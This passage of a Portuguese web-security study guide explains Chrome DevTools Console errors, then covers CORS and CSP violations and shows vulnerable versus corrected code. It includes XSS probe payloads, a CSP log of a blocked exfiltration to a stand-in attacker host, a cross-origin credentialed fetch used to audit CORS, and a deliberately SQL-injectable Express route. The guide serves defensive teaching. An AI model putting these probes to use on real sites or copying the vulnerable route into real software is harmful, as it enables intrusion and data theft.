3. **Para que serve**: Serve para apontar erros de digitação em nomes de variáveis, tentativa de usar variáveis locais fora de seu bloco de escopo ou falha no carregamento de uma biblioteca externa (ex.: tentar usar `DOMPurify.sanitize()` quando o script do `DOMPurify` falhou ao carregar).
4. **Onde encontrar no DevTools**: Na aba **Console**, sob o nível **Errors**, com o formato `Uncaught ReferenceError: <identificador> is not defined` ou `Cannot access '<identificador>' before initialization`.
5. **Exemplo prático**:
   ```javascript
   // Se o script de uma biblioteca externa foi bloqueado ou falhou ao carregar:
   const htmlSeguro = DOMPurify.sanitize(comentarioUsuario);
   ```
   Saída no Console:
   ```text
   ❌ Uncaught ReferenceError: DOMPurify is not defined
       at renderizarComentario (comentarios.js:19:22)
   ```
6. **Comportamento normal**: Não deve ocorrer no fluxo normal da aplicação. No REPL do Console, ocorre se o desenvolvedor tentar acessar uma variável local de uma função sem estar pausado em um *breakpoint* dentro daquela função.
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** Utilizar módulos ES (`import` / `export`) empacotados de forma determinística em vez de depender de variáveis globais injetadas por tags `<script>` externas na ordem correta.
8. **O que poderia indicar uma vulnerabilidade**:
   - **Confirmação de injeção JavaScript (XSS)**: se você injetar a palavra `testeXSS` em um parâmetro da página e o Console exibir **`Uncaught ReferenceError: testeXSS is not defined`**, significa que o navegador tentou **executar** a palavra `testeXSS` como uma variável JavaScript viva!
   - **Risco de *Subdomain Takeover* ou *Script Gadget* / *DOM Clobbering***: quando uma página tenta chamar uma variável global não definida (`if (typeof ConfigGlobal !== 'undefined')` ou chamada direta que lança `ReferenceError`), um atacante capaz de injetar elementos HTML com `id="ConfigGlobal"` pode criar essa referência global via **DOM Clobbering** e assumir o controle do fluxo lógico!
9. **Como investigar o problema**: Expanda o *stack trace* do `ReferenceError` no Console e clique na linha onde o identificador foi chamado. Verifique na aba *Network* se algum arquivo `.js` que deveria definir aquela variável falhou com `404`, bloqueio de CSP ou erro de DNS (caso o domínio de terceiro esteja expirado — risco grave de registro do domínio por atacantes!).
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Ative o modo estrito (`"use strict"`, padrão em módulos ES), valide todas as referências em tempo de compilação com TypeScript/ESLint e remova imediatamente tags `<script src="...">` que apontem para domínios ou arquivos desativados.

##### `TypeError`

1. **Nome do parâmetro**: **`TypeError`** (Erro de tipo incompatível de operando ou valor).
2. **O que significa**: É a exceção mais frequente em aplicações JavaScript. Ocorre quando uma operação é realizada sobre um valor cujo **tipo** não suporta aquela ação — mais comumente tentar ler uma propriedade ou chamar um método em `null` ou `undefined` (`Cannot read properties of undefined` / `null`), tentar invocar algo que não é uma função (`x is not a function`) ou tentar reatribuir uma constante (`Assignment to constant variable`).
3. **Para que serve**: Serve para revelar que uma estrutura de dados esperada pela aplicação veio vazia, nula ou em formato diferente do previsto (por exemplo, quando uma API retorna `{ erro: "Não autorizado" }` em vez do objeto `{ usuario: { perfil: ... } }` esperado pelo componente).
4. **Onde encontrar no DevTools**: Na aba **Console**, sob o nível **Errors**.
5. **Exemplo prático**:
   ```javascript
   // O código assume que document.querySelector sempre encontrará o elemento ou que user.permissions sempre é um Array:
   const dados = await (await fetch("/api/v1/perfil")).json();
   if (dados.usuario.permissoes.includes("ADMIN")) { // Se dados.usuario for undefined, lança TypeError!
     mostrarMenuAdmin();
   }
   ```
   Saída no Console:
   ```text
   ❌ Uncaught (in promise) TypeError: Cannot read properties of undefined (reading 'permissoes')
       at inicializarPainel (painel.js:8:21)
   ```
6. **Comportamento normal**: Não deve ocorrer quando a aplicação valida seus tipos e trata estados de carregamento/erro adequadamente.
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** Uso sistemático de *Optional Chaining* (`dados?.usuario?.permissoes?.includes("ADMIN")`), validação de esquema de dados (*schema validation* com bibliotecas como Zod) e programação defensiva.
8. **O que poderia indicar uma vulnerabilidade**:
   - **Bypass acidental de lógica de cliente (*Fail-Open*) ou DoS na interface**: se uma rotina que limpa dados sensíveis ou que redireciona um usuário deslogado para `/login` sofrer um `TypeError` na linha anterior (ex.: ao tentar ler `usuario.nome` quando `usuario` é `null`), a execução da função é abortada imediatamente e o redirecionamento de segurança na linha seguinte nunca acontece!
   - **Indício de *Prototype Pollution* ou *DOM Clobbering***: quando uma propriedade nativa (como `Object.prototype.toString` ou uma variável global) é sobrescrita por um tipo inesperado através de manipulação de entrada, surgem erros como `TypeError: x.y is not a function`.
9. **Como investigar o problema**: Ao ver um `TypeError` no Console, clique no link do arquivo/linha para abrir a aba **Sources**, coloque um *breakpoint* exatamente na linha do erro (ou ative o botão **Pause on caught/uncaught exceptions** na aba *Sources*), recarregue a ação e passe o mouse sobre cada variável da linha para descobrir qual delas vale `undefined` ou `null` e por quê.
10. **Como corrigir ou prevenir**: **`[RECOMENDAÇÃO]`** Adote TypeScript com `strictNullChecks: true`, utilize *Optional Chaining* (`?.`) e *Nullish Coalescing* (`??`) ao acessar propriedades aninhadas de respostas de rede e garanta que toda verificação de segurança opere em modo *Fail-Closed*.

##### `RangeError`

1. **Nome do parâmetro**: **`RangeError`** (Erro de valor fora do intervalo permitido ou estouro de pilha).
2. **O que significa**: É a exceção lançada quando um valor numérico ou parâmetro está fora do intervalo legal aceito por uma função (como criar um `new Array(-1)` ou passar um número inválido para `Number.prototype.toFixed(200)`), ou quando uma função chama a si mesma recursivamente sem condição de parada atingida, esgotando o limite da pilha de chamadas do motor V8 (**`RangeError: Maximum call stack size exceeded`**).
3. **Para que serve**: Serve para diagnosticar **recursão infinita** (*stack overflow* na pilha de chamadas do JavaScript) e parâmetros numéricos ou de tamanho inválidos.
4. **Onde encontrar no DevTools**: Na aba **Console**, sob o nível **Errors**.
5. **Exemplo prático**:
   ```javascript
   // Duas funções ou componentes que atualizam o estado um do outro em loop recursivo:
   function processarNo(no) {
     return processarNo(no); // Sem caso base de parada!
   }
   processarNo({});
   ```
   Saída no Console:
   ```text
   ❌ Uncaught RangeError: Maximum call stack size exceeded
       at processarNo (arvore.js:2:10)
       at processarNo (arvore.js:2:17)
       at processarNo (arvore.js:2:17)
       ...
   ```
6. **Comportamento normal**: Nunca deve ocorrer em operação normal.
7. **O que seria considerado seguro**: **`[REQUISITO]`** Limitar a profundidade máxima de estruturas aninhadas aceitas de fontes externas (como objetos JSON profundamente aninhados ou árvores de comentários) antes de percorrê-las recursivamente.
8. **O que poderia indicar uma vulnerabilidade**:
   - **Negação de Serviço no Cliente (*Client-Side Denial of Service*)**: se uma aplicação percorre recursivamente um objeto JSON, árvore de comentários ou parâmetros de URL controlados pelo usuário sem limite de profundidade, ou se um sanitizador de HTML antigo sofre *mutation/recursion loop* ao processar tags profundamente aninhadas (`<div><div><div>...`), um atacante pode travar a aba de qualquer usuário que visualize aquele conteúdo gerando `RangeError: Maximum call stack size exceeded`.
   - **Serialização de referências circulares**: funções customizadas de `deepClone` ou `deepMerge` vulneráveis a *Prototype Pollution* frequentemente entram em recursão infinita ao encontrar referências circulares injetadas.
9. **Como investigar o problema**: Expanda o *stack trace* do `RangeError` no Console para identificar o ciclo de funções que estão chamando umas às outras repetidamente. Clique na função na aba *Sources* e verifique qual condição de parada (*base case*) falhou.
10. **Como corrigir ou prevenir**: **`[RECOMENDAÇÃO]`** Substitua algoritmos recursivos sobre entradas de usuários por algoritmos iterativos (baseados em fila/pilha explícita com limite máximo de iterações), use `structuredClone()` nativo (que lida corretamente com referências circulares) e imponha limites de profundidade de JSON no back-end.

##### `NetworkError` (e `TypeError: Failed to fetch`)

1. **Nome do parâmetro**: **`NetworkError`** / **`TypeError: Failed to fetch`** (Exceções de falha na camada de rede ou bloqueio da requisição).
2. **O que significa**: Quando uma requisição iniciada por JavaScript falha **antes** mesmo de receber uma resposta HTTP válida do servidor — ou quando o navegador bloqueia a entrega da resposta ao script por motivos de segurança —, a API lança uma exceção:
   - Na API moderna **`fetch()`**, a especificação do WHATWG determina que falhas de rede ou bloqueios de segurança rejeitem a Promise com um **`TypeError: Failed to fetch`** (no Chrome).
   - Na API **`XMLHttpRequest` síncrona** ou em chamadas do DOM, lança-se uma **`DOMException` de nome `NetworkError`** (acompanhada no Console pela linha de erro de rede `net::ERR_...`, como `net::ERR_CONNECTION_REFUSED`, `net::ERR_NAME_NOT_RESOLVED`, `net::ERR_CERT_COMMON_NAME_INVALID`, `net::ERR_BLOCKED_BY_CLIENT` ou `net::ERR_BLOCKED_BY_RESPONSE`).
3. **Para que serve**: Serve para sinalizar ao código e ao auditor que a comunicação de rede foi abortada na camada de transporte/DNS/TLS ou bloqueada ativamente pelas políticas de segurança do navegador (CORS, CSP, *Mixed Content*, CORP — *Cross-Origin-Resource-Policy*).
4. **Onde encontrar no DevTools**: Na aba **Console** (nível **Errors**), geralmente aparecendo em **par**: primeiro a linha do navegador indicando a causa na camada de rede/política (`GET https://... net::ERR_FAILED`) e, imediatamente abaixo, a exceção JavaScript (`Uncaught (in promise) TypeError: Failed to fetch`).
5. **Exemplo prático**:
   ```text
   ❌ Access to fetch at 'https://api.externa.test/dados' from origin 'https://loja-ficticia.test' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.
   ❌ GET https://api.externa.test/dados net::ERR_FAILED 200 (OK)
   ❌ Uncaught (in promise) TypeError: Failed to fetch
       at buscarDadosExternos (integracao.js:12:20)
   ```
6. **Comportamento normal**: Pode ocorrer legitimamente se o usuário ficar sem conexão com a internet (`net::ERR_INTERNET_DISCONNECTED`) ou se uma extensão bloqueadora de rastreadores no navegador do usuário bloquear uma requisição de telemetria (`net::ERR_BLOCKED_BY_CLIENT`).
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** Importante notar um detalhe de segurança da plataforma web: o objeto de erro JavaScript `TypeError: Failed to fetch` é **intencionalmente genérico e opaco**! O navegador **não informa ao código JavaScript** o motivo detalhado da falha (se a porta estava fechada, se o DNS falhou ou se o CORS bloqueou, embora o humano veja o detalhe no Console do DevTools). Isso é feito por segurança para dificultar que um script malicioso faça varredura de portas (*port scanning*) na rede interna da vítima!
8. **O que poderia indicar uma vulnerabilidade**:
   - **`net::ERR_CERT_...` (Erros de Certificado TLS)**: indica que a aplicação está tentando se conectar a uma API com certificado expirado, autoassinado ou emitido para o domínio errado.
   - **`net::ERR_BLOCKED_BY_RESPONSE.NotSameOrigin`**: indica que o servidor de destino enviou `Cross-Origin-Resource-Policy: same-origin`, bloqueando o carregamento cross-origin.
   - **Tentativas de conexão para IPs privados (`127.0.0.1`, `192.168.x.x`, `10.x.x.x`) bloqueadas por *Private Network Access (PNA)***: se você vir no Console um script tentando fazer `fetch('http://127.0.0.1:8080/...')` ou `fetch('http://192.168.1.1/...')`, a página (ou um script de terceiros nela) pode estar tentando explorar serviços locais na máquina ou no roteador do usuário!
9. **Como investigar o problema**: Nunca olhe apenas para a linha `TypeError: Failed to fetch` isoladamente; olhe sempre para a **linha imediatamente acima dela no Console** (certificando-se de que *Hide network messages* esteja desmarcado em `⚙ Console settings`) e clique no link da requisição para inspecioná-la na aba **Network**.
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Trate falhas de `fetch()` com blocos `try...catch` exibindo mensagens claras de indisponibilidade de conexão ao usuário, corrija configurações de TLS/CORS/CSP nos servidores próprios e investigue imediatamente qualquer tentativa de script de acessar IPs de rede local ou domínios desconhecidos.

##### `Uncaught Exception`

1. **Nome do parâmetro**: **`Uncaught Exception`** (Exceção síncrona não capturada — prefixo `Uncaught ...`).
2. **O que significa**: Quando uma instrução `throw new Error(...)` (ou um erro nativo como `TypeError`, `ReferenceError`, `SyntaxError`) é disparada dentro de uma pilha de execução síncrona e **nenhum bloco `try { ... } catch (e) { ... }`** existe ao longo de toda a cadeia de funções para interceptá-la, a exceção "escapa" para o escopo global da janela, interrompe imediatamente a execução daquela tarefa (*task*) atual do Event Loop e é impressa no Console com o prefixo **`Uncaught`**.
3. **Para que serve**: Serve para alertar que ocorreu uma falha imprevista que o código não soube tratar, abortando o restante da função atual e potencialmente quebrando o ciclo de vida da interface (por exemplo, desmontando toda a árvore de componentes React se não houver um *Error Boundary*).
4. **Onde encontrar no DevTools**: Na aba **Console** (nível **Errors**), iniciando por `Uncaught <TipoDoErro>: <Mensagem>` seguido pelo *stack trace* completo. Na aba **Sources**, você pode marcar o checkbox **Pause on uncaught exceptions** no painel *Breakpoints* para que o depurador congele a execução no instante exato em que uma exceção não tratada estiver prestes a ocorrer!
5. **Exemplo prático**:
   ```javascript
   function validarIdade(valor) {
     if (Number.isNaN(Number(valor))) {
       throw new Error(`Valor inválido recebido para idade: ${valor}`);
     }
     return Number(valor) >= 18;
   }
   validarIdade("abc"); // Sem try/catch ao redor!
   ```
   Saída no Console:
   ```text
   ❌ Uncaught Error: Valor inválido recebido para idade: abc
       at validarIdade (cadastro.js:3:11)
       at cadastro.js:7:1
   ```
6. **Comportamento normal**: Zero ocorrências de `Uncaught` durante a navegação normal da aplicação.
7. **O que seria considerado seguro**: **`[REQUISITO]`** Capturar erros previsíveis localmente com `try...catch`, utilizar *Error Boundaries* na camada de visualização para impedir tela branca (*White Screen of Death*) e registrar um *listener* global `window.addEventListener('error', ...)` apenas para telemetria sanitizada.
8. **O que poderia indicar uma vulnerabilidade**:
   - **Interrupção de fluxos de segurança**: todo código que fica **abaixo** da linha onde ocorreu uma `Uncaught Exception` dentro da mesma função **deixa de ser executado**. Se uma rotina de limpeza de sessão, validação ou bloqueio de UI estiver após uma linha que lança `Uncaught Error`, ela será ignorada.
   - **Vazamento de lógica interna**: a mensagem da exceção não tratada e sua pilha completa de chamadas ficam expostas no Console.
9. **Como investigar o problema**: Quando uma `Uncaught Exception` aparecer no Console, abra a aba **Sources**, marque **Pause on uncaught exceptions** (ícone de octógono de pausa ou painel lateral direito *Breakpoints*) e repita a ação na página. O Chrome pausará na linha exata do erro com todas as variáveis locais da função disponíveis na seção *Scope* para você inspecionar!
10. **Como corrigir ou prevenir**: **`[RECOMENDAÇÃO]`** Envolva operações falíveis (`JSON.parse`, acessos a APIs externas, manipulação de entradas) em blocos `try...catch` bem definidos e implemente *Error Boundaries* nos componentes raiz da aplicação.

##### `Unhandled Promise Rejection`

1. **Nome do parâmetro**: **`Unhandled Promise Rejection`** (Rejeição de Promise não tratada — exibido como `Uncaught (in promise) ...`).
2. **O que significa**: É o equivalente assíncrono da *Uncaught Exception*. Ocorre quando uma `Promise` entra no estado `rejected` (seja por `Promise.reject()`, por um `throw` dentro de uma função `async` ou por falha em `fetch()`) e **nenhum tratador `.catch()`** ou bloco **`try { await ... } catch`** foi anexado a ela até o fim do turno atual da fila de microtarefas (*microtasks*). O navegador dispara o evento global `unhandledrejection` em `window` e imprime no Console um erro vermelho prefixado por **`Uncaught (in promise)`**.
3. **Para que serve**: Serve para denunciar fluxos assíncronos "órfãos" cujos erros foram silenciosamente ignorados pelo desenvolvedor, evitando que falhas de API, autenticação ou banco de dados local (`IndexedDB`) passem despercebidas.
4. **Onde encontrar no DevTools**: Na aba **Console** (nível **Errors**), sempre iniciando com o texto **`Uncaught (in promise)`**.
5. **Exemplo prático**:
   ```javascript
   async function sincronizarPerfil() {
     const resp = await fetch("/api/v1/perfil");
     if (resp.status === 401) {
       throw { codigo: "TOKEN_EXPIRADO", servidorInterno: "auth-node-04.internal", tokenAntigo: "eyJ..." };
     }
   }
   // Chamada sem await/try-catch e sem .catch():
   sincronizarPerfil();
   ```
   Saída no Console:
   ```text
   ❌ Uncaught (in promise) ▶ {codigo: 'TOKEN_EXPIRADO', servidorInterno: 'auth-node-04.internal', tokenAntigo: 'eyJ...'}
   ```
6. **Comportamento normal**: Nenhuma Promise deve ser rejeitada sem tratamento em produção.
7. **O que seria considerado seguro**: **`[REQUISITO]`** Toda chamada assíncrona deve ter seu caminho de falha tratado explicitamente (por exemplo, se uma Promise de verificação de sessão rejeitar com `401`, o `.catch()` deve limpar o estado local e redirecionar o usuário para a tela de autenticação, sem despejar objetos internos no Console).
8. **O que poderia indicar uma vulnerabilidade**:
   - **Vazamento do objeto de rejeição de bibliotecas HTTP**: bibliotecas como Axios ou clientes GraphQL rejeitam a Promise passando um objeto rico contendo `config` (com cabeçalhos `Authorization`, URL base interna, payload enviado) e `response` (com corpo do erro do servidor). Quando o desenvolvedor esquece o `.catch()`, o navegador imprime **todo esse objeto expansível** automaticamente na linha `Uncaught (in promise)` do Console!
   - **Estado zumbi de sessão**: a interface continua exibindo que o usuário está logado ou que uma operação foi salva porque a rejeição da Promise que avisava sobre a falha não foi capturada para atualizar a tela.
9. **Como investigar o problema**: Procure por linhas `Uncaught (in promise)` na aba Console. Expanda o objeto ou erro impresso logo após `Uncaught (in promise)` para inspecionar todas as propriedades internas anexadas à rejeição, e expanda a pilha de chamadas assíncrona (*async stack trace*) para localizar qual função chamou a Promise sem `.catch()`.
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Trate todas as Promises com `try { await ... } catch (err) { ... }` ou `.catch()`, sanitize objetos de erro em interceptadores globais de cliente HTTP antes de propagá-los e monitore o evento `window.addEventListener("unhandledrejection", ...)` para detectar eventuais omissões.

##### `CORS errors`

1. **Nome do parâmetro**: **`CORS errors`** (Erros de bloqueio por Política de Compartilhamento de Recursos entre Origens Diferentes).
2. **O que significa**: São mensagens de erro emitidas nativamente pelo navegador quando o código JavaScript de uma origem `A` (ex.: `https://loja-ficticia.test`) tenta realizar uma requisição HTTP para uma origem `B` diferente (ex.: `https://api.pagamentos.test` ou `http://loja-ficticia.test:8080`) via `fetch()`, `XMLHttpRequest`, carregamento de fontes web ou módulos, e a resposta do servidor `B` **não satisfaz as regras do protocolo CORS** definidas no *Fetch Standard*.
3. **Para que serve**: Serve para explicar exatamente **qual regra do CORS falhou**, diferenciando problemas na requisição *preflight* (`OPTIONS`) de problemas na resposta principal (`GET`/`POST`), problemas de credenciais (`credentials: 'include'`) ou cabeçalhos não autorizados.
4. **Onde encontrar no DevTools**: Na aba **Console** (nível **Errors**, quando *Show CORS errors in console* está ativo), na aba **Issues** (com diagnóstico guiado passo a passo) e na aba **Network** (onde a requisição aparece com status `CORS error`).
5. **Exemplo prático**:
   Os três erros de CORS mais cobrados em provas e encontrados na prática são:
   ```text
   # Caso 1: Ausência completa do cabeçalho Access-Control-Allow-Origin na resposta do servidor:
   ❌ Access to fetch at 'https://api.loja-ficticia.test/v1/dados' from origin 'https://app.loja-ficticia.test' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.

   # Caso 2: Proibição de curinga (*) quando a requisição envia credenciais (cookies/Authorization):
   ❌ Access to fetch at 'https://api.loja-ficticia.test/v1/perfil' from origin 'https://app.loja-ficticia.test' has been blocked by CORS policy: The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*' when the request's credentials mode is 'include'.

   # Caso 3: Falha no Preflight (OPTIONS) por cabeçalho customizado não listado em Access-Control-Allow-Headers:
   ❌ Access to fetch at 'https://api.loja-ficticia.test/v1/pedidos' from origin 'https://app.loja-ficticia.test' has been blocked by CORS policy: Request header field x-api-token is not allowed by Access-Control-Allow-Headers in preflight response.
   ```
   > [!IMPORTANT]
   > **Conceito fundamental de prova sobre CORS**: Em requisições simples (*simple requests*, como `GET` ou `POST` com `Content-Type: application/x-www-form-urlencoded` sem cabeçalhos customizados), o navegador **envia a requisição ao servidor e o servidor a processa normalmente**, mas o navegador **bloqueia a leitura da resposta pelo JavaScript** se o cabeçalho `Access-Control-Allow-Origin` não for válido! Por isso, **CORS não substitui proteção contra CSRF** em requisições simples: o efeito colateral no servidor já aconteceu antes do erro de CORS aparecer no Console!
6. **Comportamento normal**: Qualquer tentativa de leitura *cross-origin* não autorizada explicitamente pelo servidor de destino gera imediatamente um erro de CORS no Console e impede que o script acesse o corpo e os cabeçalhos da resposta.
7. **O que seria considerado seguro**: **`[REQUISITO]`** O servidor deve retornar `Access-Control-Allow-Origin: https://app.loja-ficticia.test` apenas para origens confiáveis verificadas em uma lista de permissão (*allowlist*) estrita no back-end, acompanhado de `Vary: Origin`.
8. **O que poderia indicar uma vulnerabilidade**:
   - Conforme explicado na [Seção 1.11.3](./01b-fundamentos-web-parte2.md#s1-11-3) e na [Seção 5.10](./05-headers-de-seguranca.md#s5-10), a vulnerabilidade de CORS **não é a presença do erro de CORS no Console**, e sim a **ausência do bloqueio quando você faz uma requisição a partir de uma origem externa não autorizada**! Se o servidor refletir qualquer header `Origin: https://site-malicioso.test` com `Access-Control-Allow-Credentials: true`, **nenhum erro de CORS ocorrerá** e o site malicioso conseguirá ler todos os dados confidenciais do usuário autenticado!
9. **Como investigar o problema**:
   - Para depurar um bloqueio legítimo: leia na mensagem do Console qual cabeçalho faltou (`Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, `Access-Control-Allow-Methods` ou `Access-Control-Allow-Headers`) e inspecione a requisição `OPTIONS` na aba *Network*.
   - Para auditar se uma API tem **CORS vulnerável (permissivo demais)**: abra no navegador uma página em outra origem de teste (ex.: `https://exemplo.test`), abra o Console dessa página e execute:
     ```javascript
     fetch("https://api.loja-ficticia.test/v1/perfil", { credentials: "include" })
       .then(r => r.text())
       .then(dados => console.log("VULNERÁVEL! Dados lidos cross-origin:", dados))
       .catch(err => console.log("SEGURO: Bloqueado pelo CORS conforme esperado."));
     ```
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Nunca use `Access-Control-Allow-Origin: *` para rotas privadas; nunca reflita dinamicamente o cabeçalho `Origin` da requisição sem validá-lo contra uma lista fechada de origens exatas; nunca aceite a origem `null`; e sempre implemente proteção anti-CSRF independente do CORS.

##### `CSP violations`

1. **Nome do parâmetro**: **`CSP violations`** (Erros e avisos de violação da Política de Segurança de Conteúdo — *Content Security Policy*).
2. **O que significa**: São mensagens de erro (ou de aviso, quando em modo `Content-Security-Policy-Report-Only`) geradas pelo navegador sempre que a página tenta carregar um recurso externo (script, folha de estilo, imagem, fonte, frame, conexão `fetch`/`WebSocket`) ou executar código JavaScript inline (`<script>...</script>`, atributos `onclick=...`, URLs `javascript:` ou `eval()`) que **viola as diretivas definidas no cabeçalho HTTP `Content-Security-Policy`** (ou `<meta http-equiv="Content-Security-Policy">`).
3. **Para que serve**: Serve como o registro direto de atuação da principal camada de defesa do navegador contra ataques de **XSS (*Cross-Site Scripting*)**, **Clickjacking** (`frame-ancestors`) e **exfiltração de dados** (`connect-src`, `form-action`).
4. **Onde encontrar no DevTools**: Na aba **Console** (sob **Errors** quando a política bloqueia ativamente com `Refused to ...`, ou sob **Warnings** / **Errors** prefixado por `[Report Only]` quando em modo de monitoramento), além da aba **Issues** e **Application > Frames**.
5. **Exemplo prático**:
   Veja como o Console reporta diferentes bloqueios de CSP:
   ```text
   # 1. Bloqueio de script inline (tentativa de XSS ou script sem nonce/hash):
   ❌ Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self' 'nonce-rAnd0m123'". Either the 'unsafe-inline' keyword, a hash ('sha256-47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU='), or a nonce ('nonce-...') is required to enable inline execution.

   # 2. Bloqueio de uso de eval() ou new Function():
   ❌ Uncaught EvalError: Refused to evaluate a string as JavaScript because 'unsafe-eval' is not an allowed source of script in the following Content Security Policy directive: "script-src 'self'".

   # 3. Bloqueio de exfiltração de dados via fetch() para domínio externo não autorizado:
   ❌ Refused to connect to 'https://coletor-atacante.test/roubo' because it violates the following Content Security Policy directive: "connect-src 'self' https://api.loja-ficticia.test".

   # 4. Bloqueio de embutimento em iframe (proteção contra Clickjacking via frame-ancestors):
   ❌ Refused to frame 'https://loja-ficticia.test/' because an ancestor violates the following Content Security Policy directive: "frame-ancestors 'none'".
   ```
6. **Comportamento normal**: Em uma aplicação bem configurada e sem ataques em andamento, nenhuma violação de CSP deve ocorrer para os recursos próprios da aplicação. Se um atacante tentar injetar `<script>alert(1)</script>` ou `<img src=x onerror=alert(1)>`, o navegador **impede a execução** e imprime a mensagem `Refused to execute inline script...` no Console!
7. **O que seria considerado seguro**: **`[REQUISITO]`** Possuir uma política CSP ativa que bloqueie scripts *inline* não autorizados, proíba `eval()` (sem `'unsafe-eval'`) e restrinja `object-src 'none'`, `base-uri 'self'` e `frame-ancestors`, de modo que qualquer tentativa de injeção no Console ou na página resulte imediatamente em um bloqueio `Refused to ...`.
8. **O que poderia indicar uma vulnerabilidade**:
   - **Tentativa de ataque XSS ou *Skimming* bloqueada**: ver no Console uma violação de CSP tentando carregar um script de um domínio desconhecido ou executar um evento `onerror` inline indica que existe uma **vulnerabilidade de injeção de HTML/XSS na aplicação**, embora a exploração tenha sido contida pelo CSP!
   - **Política CSP fraca ou contornável (*CSP Bypass*)**: se a mensagem do Console mostrar a diretiva completa da aplicação e você observar nela termos como `script-src * 'unsafe-inline' 'unsafe-eval' data:` ou domínios públicos que hospedam endpoints JSONP / bibliotecas Angular antigas na *allowlist*, o CSP da aplicação é ineficaz e pode ser contornado.
9. **Como investigar o problema**:
   1. Leia a mensagem completa da violação no Console: o Chrome informa exatamente **o que foi bloqueado**, **qual diretiva bloqueou** (ex.: `script-src`, `style-src`, `img-src`, `connect-src`), **qual era a política configurada** e até calcula automaticamente o hash `'sha256-...'` sugerido se for um script estático!
   2. Clique no arquivo e linha indicados à direita da violação para localizar no HTML ou no JavaScript o elemento exato que causou o disparo.
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Nunca "corrija" violações de CSP adicionando `'unsafe-inline'` ou `'unsafe-eval'` à diretiva `script-src`! Em vez disso, mova códigos inline para arquivos `.js` externos servidos da própria origem (`'self'`), remova atributos `onclick` usando `addEventListener`, ou utilize **nonces criptográficos** gerados a cada requisição (`'nonce-...'` + `'strict-dynamic'`) conforme detalhado na [Seção 5.1](./05-headers-de-seguranca.md#s5-1).

---

<a id="s2-3-5"></a>
#### 2.3.5 Segurança na aba Console (Diagnóstico e Código Vulnerável vs. Corrigido)

Em auditorias de segurança e provas práticas, a aba Console é ao mesmo tempo um **sensor de vulnerabilidades** (onde falhas de arquitetura deixam rastros visíveis) e uma **bancada de testes ativa** (onde o analista verifica se controles de segurança existem de fato no servidor ou apenas cosmeticamente no cliente).

A seguir, estudaremos detalhadamente os **nove cenários críticos de segurança** diagnosticados pela aba Console, apresentando para cada um: a explicação técnica do risco, como ele aparece no Console, o **código vulnerável** e o **código corrigido**.

---

##### 1. Erros que revelam informações internas

###### O problema e como diagnosticar no Console
Aplicações frequentemente capturam erros de APIs ou exceções internas e os imprimem integralmente no Console (ou lançam exceções customizadas detalhadas), expondo informações que jamais deveriam sair do perímetro do servidor (**Information Disclosure** — Divulgação de Informações, mapeada na CWE-209 e relacionada ao *Security Misconfiguration* do OWASP Top 10 — *Open Worldwide Application Security Project*).

No Console, isso aparece quando uma falha de requisição (`400`, `403`, `500`) vem acompanhada de um `console.error()` que exibe a resposta JSON do servidor contendo a **consulta SQL exata**, o **nome do banco de dados e tabelas**, **endereços IP internos** (`10.x.x.x`, `172.16.x.x`, `192.168.x.x`), **versões de bibliotecas** ou **caminhos do sistema de arquivos do servidor** (`/home/deploy/api-financeira/src/...`). Essas informações fornecem um mapa completo para que um atacante calibre ataques de SQL Injection ou Path Traversal.

###### Exemplo de Código Vulnerável
```javascript
// [BACK-END VULNERÁVEL - Node.js / Express]
app.get("/api/v1/produtos", async (req, res) => {
  try {
    const categoria = req.query.categoria;
    const resultado = await db.query(`SELECT * FROM tb_produtos_internos WHERE cat = '${categoria}'`);
    res.json(resultado.rows);
  } catch (err) {
    // ERRO GRAVE: Devolve detalhes internos do banco, query e host para o cliente!
    res.status(500).json({
      erro: err.message,
      queryExecutada: err.InternalQuery,
      bancoHost: process.env.DB_HOST_INTERNAL,
      detalheDriver: err.stack
    });
  }
});

// [FRONT-END VULNERÁVEL]
async function buscarProdutos(cat) {
  const resp = await fetch(`/api/v1/produtos?categoria=${encodeURIComponent(cat)}`);
  if (!resp.ok) {
    const erroInterno = await resp.json();
    // Despeja todo o diagnóstico interno do servidor no Console do navegador!
    console.error("Falha detalhada do servidor:", erroInterno);
  }
}
```

###### Exemplo de Código Corrigido
**`[REQUISITO]`** Utilize consultas parametrizadas (*Prepared Statements*), registre os detalhes técnicos do erro **exclusivamente nos logs internos do servidor** com um identificador de correlação (`correlationId` / `traceId`) e retorne ao cliente apenas uma mensagem genérica padronizada:

```javascript
// [BACK-END CORRIGIDO - Node.js / Express]
import crypto from "node:crypto";

app.get("/api/v1/produtos", async (req, res) => {
  const traceId = crypto.randomUUID();
  try {
    const categoria = String(req.query.categoria || "");
    // Consulta parametrizada (imune a SQL Injection):
    const resultado = await db.query(
      "SELECT id, nome, preco FROM tb_produtos_internos WHERE cat = $1",
      [categoria]
    );
    res.json(resultado.rows);
  } catch (err) {
    // 1. Loga o erro completo APENAS no servidor (SIEM / observabilidade interna):
    loggerServidor.error({ traceId, err, rota: "/api/v1/produtos" });

    // 2. Retorna ao cliente apenas uma mensagem genérica e o código de protocolo:
    res.status(500).json({
      mensagem: "Não foi possível processar a solicitação no momento.",
      protocolo: traceId
    });
  }
});

// [FRONT-END CORRIGIDO]
async function buscarProdutos(cat) {
  const resp = await fetch(`/api/v1/produtos?categoria=${encodeURIComponent(cat)}`);
  if (!resp.ok) {
    const { protocolo } = await resp.json().catch(() => ({ protocolo: "N/A" }));
    exibirNotificacaoUsuario(`Ocorreu um erro temporário. Código de suporte: ${protocolo}`);
  }
}
```

---

##### 2. Stack traces expostos

###### O problema e como diagnosticar no Console
Um **Stack Trace (Pilha de Chamadas)** mostra a sequência exata de arquivos, funções, linhas e colunas executadas até o momento em que uma exceção ocorreu. Há dois níveis de exposição de *stack trace* visíveis no Console:
